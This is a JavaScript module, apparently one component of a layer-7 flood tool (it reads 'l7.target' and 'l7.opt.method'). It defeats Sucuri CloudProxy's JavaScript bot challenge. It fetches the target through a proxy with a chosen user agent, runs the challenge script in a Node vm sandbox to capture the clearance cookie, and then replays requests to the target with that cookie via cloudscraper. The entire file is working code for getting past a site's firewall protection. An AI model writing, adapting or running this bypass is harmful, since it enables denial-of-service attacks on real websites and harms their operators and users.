module.exports = function Sucuri() {
    const request = require('request'),
        vm = require('vm'),
        CHALLENGE_REGEXP = /<script>([^]+?)<\/script>/,
        COOKIE_REGEXP = /(sucuri_cloudproxy_uuid_[0-9a-f]{9})=([0-9a-f]{32});?/,
        cloudscraper = require('cloudscraper').defaults({
            agentOptions: {
                ciphers: 'TLS_AES_128_GCM_SHA256',
            }
        });

    function createEnvironment(cookieCallback) {
        var document = {};
        Object.defineProperty(document, 'cookie', {
            set: value => cookieCallback(value)
        });

        var location = {
            reload: () => {}
        };

        var environment = {
            location,
            document
        }

        return environment;
    }

    function parseCookie(cookie) {
        return new Promise((resolve, reject) => {
            var match = cookie.match(COOKIE_REGEXP);
            if (match === null) {
                reject('[sucuri]: cannot parse cookie')
            } else {
                //match[1]; // Cookie name
                //match[2]; // Cookie value
                resolve(match[1] + '=' + match[2]);
            }
        });
    }

    function solve(challenge) {
        return new Promise((resolve, reject) => {
            var environment = createEnvironment(cookie => {
                resolve(parseCookie(cookie));
            });

            try {
                vm.runInNewContext(challenge, environment, {
                    timeout: 1e3
                });
                reject('[sucuri]: Timed out while getting cookie.');
            } catch (e) {
                reject(e.message);
            }
        });
    }

    function Bypasser(body) {
        return new Promise((resolve, reject) => {
            var match = body.match(CHALLENGE_REGEXP);
            if (match === null) {
                reject('[sucuri]: cannot find Sucuri challenge')
            } else {
                var challenge = match[1];
                resolve(solve(challenge));
            }
        });
    }

    return function bypass(proxy, uagent, callback) {
        request.get({
            url: l7.target,
            gzip: true,
            proxy: proxy,
            followAllRedirects: true,
            headers: {
                'Connection': 'Keep-Alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': 1,
                'User-Agent': uagent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept': 'application/json',
                'Content-type': 'application/json; charset=utf-8', 
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': "1",
            }
        }, (err, res, body) => {
            if (err || !res || !body) {
                return false;
            }
            Bypasser(body).then(cookie => {
                cloudscraper({
                    method: l7.opt.method,
                    url: l7.target,
                    gzip: true,
                    proxy: proxy,
                    followAllRedirects: true,
                    headers: {
                        'Connection': 'Keep-Alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': uagent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                        'Accept': 'application/json',
                        'Content-type': 'application/json; charset=utf-8', 
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': "1",
                        "Cookie": cookie
                    }
                }, (err, res, body) => {
                    if (err) {
                        return false;
                    }
                    console.log(cookie);
                    callback(cookie);
                })
            });
        });
    }
}